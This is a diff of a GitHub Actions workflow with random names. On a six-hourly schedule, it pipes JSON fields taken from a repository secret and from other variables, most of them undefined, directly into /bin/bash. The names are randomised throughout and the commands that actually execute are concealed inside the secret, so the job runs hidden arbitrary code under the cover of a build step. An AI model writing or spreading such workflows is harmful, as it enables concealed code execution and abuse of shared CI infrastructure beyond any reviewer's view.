@@ -1,10 +1,10 @@
 name: taoshiwang1234
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '34 3/6 * * *'
-jobs:  # 29621
+    - cron: '56 5/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,10 +12,18 @@ jobs:  # 29621
       - uses: actions/checkout@v4
       - name: taoshiwang1234
         env:
-          r4828: ${{ secrets.r4828 }}
+          pqwjf1: ${{ secrets.pqwjf1 }}
         run: |
-          echo $r4828 | jq -r .udx75486 | /bin/bash
-          echo $jydv8 | jq -r .rxkw86625 | /bin/bash
-          echo $pbxx20895 | jq -r .clup315 | /bin/bash
-          echo $je8498 | jq -r .u5 | /bin/bash
+          echo $pqwjf1 | jq -r .ur98040 | /bin/bash
+          echo $j743 | jq -r .dab0991 | /bin/bash
+          echo $rkk1801 | jq -r .b31 | /bin/bash
+          echo $sc2 | jq -r .ena84 | /bin/bash
+          echo $dh15138 | jq -r .qnci49659 | /bin/bash
+          echo $zh643 | jq -r .i81 | /bin/bash
+          echo $n9 | jq -r .d19 | /bin/bash
+          echo $wznp6943 | jq -r .do5 | /bin/bash
+          echo $nkbad9 | jq -r .hrrya05290 | /bin/bash
+          echo $cc05 | jq -r .nshso77344 | /bin/bash
+          echo $a5434 | jq -r .xpjr4588 | /bin/bash
+          echo $p192 | jq -r .u352 | /bin/bash
 
